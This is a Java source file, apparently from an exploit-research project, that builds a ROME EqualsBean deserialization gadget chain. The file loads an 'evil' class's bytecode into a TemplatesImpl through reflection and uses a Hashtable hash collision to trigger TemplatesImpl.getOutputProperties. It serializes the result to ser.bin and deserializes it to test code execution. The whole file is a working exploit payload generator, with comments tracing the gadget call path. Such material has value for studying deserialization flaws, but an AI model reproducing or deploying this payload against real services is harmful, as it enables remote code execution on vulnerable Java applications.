package org.exploit.third.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.shiro.crypto.hash.Hash;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;


//HashSet.readObject
//HashMap.put
//HashMap.putval
//HashMap.equals
//AbastractMap.equals
//EqualsBean.equals
//EqualsBean.beanEquals
//TemplatesImpl.getOutputProperties()
//or
//HashTable.readObject(ObjectInputStream)
//HashTable.reconstitutionPut()
//HashMap.equals
//AbstractMap.equals
//EqualsBean.equals
//EqualsBean.beanEquals
//TemplatesImpl.getOutputProperties()
public class Rome_EqualsBeans {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        TemplatesImpl fakeTemplates = new TemplatesImpl();
        HashMap fakehashMap = new HashMap();
        EqualsBean equalsBean = new EqualsBean(HashMap.class, fakehashMap);
//        equalsBean.equals(fakeTemplates);
//        HashSet hashSet = new HashSet();
        Hashtable hashtable = new Hashtable();
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("zZ", fakeTemplates);
        hashMap1.put("yy", equalsBean);
        hashMap2.put("zZ", equalsBean);
        hashMap2.put("yy", fakeTemplates);
        hashtable.put(hashMap2,1);
        hashtable.put(hashMap1,2);
        Field _beanClassField = EqualsBean.class.getDeclaredField("_beanClass");
        _beanClassField.setAccessible(true);
        _beanClassField.set(equalsBean, Templates.class);
        Field _objField = EqualsBean.class.getDeclaredField("_obj");
        _objField.setAccessible(true);
        _objField.set(equalsBean, templatesClass);
        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
